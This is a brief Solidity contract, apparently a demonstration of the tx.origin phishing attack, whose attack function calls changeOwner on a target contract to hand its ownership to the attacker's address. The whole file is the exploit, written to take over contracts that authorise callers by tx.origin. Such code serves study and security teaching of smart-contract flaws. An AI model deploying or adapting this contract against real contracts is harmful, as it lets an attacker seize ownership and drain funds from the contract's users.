pragma solidity ^0.8.7;
contract TxOriginAttack {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack(address _target) public {
        _target.call(abi.encodeWithSignature("changeOwner(address)", owner));
    }
}